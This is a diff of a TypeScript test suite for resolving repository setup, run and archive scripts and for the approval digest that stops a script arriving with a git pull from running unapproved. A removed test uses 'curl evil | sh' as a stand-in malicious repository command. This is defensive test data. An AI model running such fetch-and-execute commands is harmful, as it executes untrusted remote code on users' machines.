@@ -44,7 +44,6 @@ describe('resolveScript', () => {
     const resolved = await resolveScript('setup', cwd, 'planner', root)
     expect(resolved).toMatchObject({
       source: 'project',
-      run: { type: 'file' },
       contents: '#!/bin/sh\nnpm install\n'
     })
   })
@@ -57,39 +56,19 @@ describe('resolveScript', () => {
     expect(resolved).toMatchObject({
       source: 'repoOctopus',
       from: octopusScriptPath('setup'),
-      run: { type: 'file', path: join(cwd, '.octopus', 'scripts', 'setup.sh') },
+      path: join(cwd, '.octopus', 'scripts', 'setup.sh'),
       contents: 'from the repository\n'
-    })
-  })
-
-  it('reads .conductor when there is no .octopus, as a command rather than a file', async () => {
-    await put('.conductor/settings.toml', '[scripts]\nsetup = "bash .conductor/setup.sh"\n')
-
-    expect(await resolveScript('setup', cwd, 'planner', root)).toMatchObject({
-      source: 'repoConductor',
-      from: join('.conductor', 'settings.toml'),
-      run: { type: 'command', command: 'bash .conductor/setup.sh' },
-      contents: 'bash .conductor/setup.sh'
-    })
-  })
-
-  it('lets .octopus win over .conductor', async () => {
-    await put('.conductor/settings.toml', '[scripts]\nrun = "conductor"\n')
-    await put('.octopus/scripts/run.sh', 'octopus\n')
-
-    expect(await resolveScript('run', cwd, 'planner', root)).toMatchObject({
-      source: 'repoOctopus'
     })
   })
 
   it('falls through one kind at a time', async () => {
     // A repository naming only a server script leaves the other two to the
     // project — the chain is per script, not per repository.
-    await put('.conductor/settings.toml', '[scripts]\nrun = "bin/rails server"\n')
+    await put('.octopus/scripts/run.sh', 'bin/rails server\n')
     await writeScript('setup', 'planner', 'local setup\n', root)
 
     const scripts = await resolveScripts(cwd, 'planner', root)
-    expect(scripts.run?.source).toBe('repoConductor')
+    expect(scripts.run?.source).toBe('repoOctopus')
     expect(scripts.setup?.source).toBe('project')
     expect(scripts.archive).toBeUndefined()
   })
@@ -120,7 +99,7 @@ describe('scriptsDigest', () => {
   })
 
   it('covers what the repository supplies and ignores what the user wrote', async () => {
-    await put('.conductor/settings.toml', '[scripts]\nrun = "bin/rails server"\n')
+    await put('.octopus/scripts/run.sh', 'bin/rails server\n')
     const withProject = await resolveScripts(cwd, 'planner', root)
 
     await writeScript('setup', 'planner', 'local setup\n', root)
@@ -132,33 +111,17 @@ describe('scriptsDigest', () => {
     expect(scriptsDigest(andAnother)).toBe(scriptsDigest(withProject))
   })
 
-  it("changes when the repository's script changes", async () => {
-    await put('.conductor/settings.toml', '[scripts]\nrun = "bin/rails server"\n')
-    const before = scriptsDigest(await resolveScripts(cwd, 'planner', root))
-
-    await put('.conductor/settings.toml', '[scripts]\nrun = "curl evil | sh"\n')
-    const after = scriptsDigest(await resolveScripts(cwd, 'planner', root))
-
-    expect(after).not.toBe(before)
-  })
-
-  it('covers a script the repository carries as a file, not only a command line', async () => {
-    /*
-     * Every other test here uses `.conductor`, so narrowing the filter in
-     * `scriptsDigest` to that one source left the suite green while a
-     * `.octopus/scripts/setup.sh` arriving with a `git pull` ran unapproved.
-     * `.octopus/` is this app's own export format, so a repository carrying one
-     * is the ordinary case rather than the exotic one.
-     */
+  it('covers a script the repository carries', async () => {
+    // A `.octopus/scripts/setup.sh` arriving with a `git pull` must not run
+    // unapproved.
     await put('.octopus/scripts/setup.sh', '#!/bin/sh\nmake dev\n')
 
     expect(scriptsDigest(await resolveScripts(cwd, 'planner', root))).not.toBe('')
   })
 
   it("moves when the body of a repository's script file changes", async () => {
-    // The digest was only ever exercised over a command line. For a file the
-    // text that matters is its contents, and a pull that rewrites them has to
-    // ask again.
+    // The text that matters is the file's contents, and a pull that rewrites
+    // them has to ask again.
     await put('.octopus/scripts/setup.sh', '#!/bin/sh\nmake dev\n')
     const before = scriptsDigest(await resolveScripts(cwd, 'planner', root))
 
@@ -167,13 +130,14 @@ describe('scriptsDigest', () => {
     expect(scriptsDigest(await resolveScripts(cwd, 'planner', root))).not.toBe(before)
   })
 
-  it('tells the same command apart by which script it is', async () => {
-    // The kind goes into the digest beside the text. Approving a line as the
+  it('tells the same text apart by which script it is', async () => {
+    // The kind goes into the digest beside the text. Approving a body as the
     // cleanup script is not approving it as the one that runs on every build.
-    await put('.conductor/settings.toml', '[scripts]\narchive = "same line"\n')
+    await put('.octopus/scripts/archive.sh', 'same body\n')
     const asArchive = scriptsDigest(await resolveScripts(cwd, 'planner', root))
 
-    await put('.conductor/settings.toml', '[scripts]\nsetup = "same line"\n')
+    await rm(join(cwd, '.octopus'), { recursive: true })
+    await put('.octopus/scripts/setup.sh', 'same body\n')
     const asSetup = scriptsDigest(await resolveScripts(cwd, 'planner', root))
 
     expect(asSetup).not.toBe(asArchive)
@@ -193,33 +157,6 @@ describe('repoInstruction', () => {
       from: octopusInstructionPath('pullRequest'),
       body: '# How we describe a change\n'
     })
-  })
-
-  it("takes Conductor's prompt where there is no .octopus one", async () => {
-    await put('.conductor/settings.toml', '[prompts]\ncreate_pr = "target develop"\n')
-
-    await expect(repoInstruction('pullRequest', cwd)).resolves.toMatchObject({
-      source: 'repoConductor',
-      body: 'target develop'
-    })
-  })
-
-  it('lets .octopus win, as it does for a script', async () => {
-    await put('.conductor/settings.toml', '[prompts]\ncreate_pr = "from conductor"\n')
-    await put('.octopus/instructions/pull-request.md', 'from octopus\n')
-
-    await expect(repoInstruction('pullRequest', cwd)).resolves.toMatchObject({
-      source: 'repoOctopus'
-    })
-  })
-
-  it('has nothing for a kind Conductor has no counterpart for', async () => {
-    // Four of the seven map; the rest fall through to the project's own, then
-    // the installation's, then the written template.
-    await put('.conductor/settings.toml', '[prompts]\ncode_review = "review it"\n')
-
-    await expect(repoInstruction('commitMessage', cwd)).resolves.toBeNull()
-    await expect(repoInstruction('review', cwd)).resolves.toMatchObject({ body: 'review it' })
   })
 
   it('keeps an empty one, which is how a repository says it adds nothing', async () => {
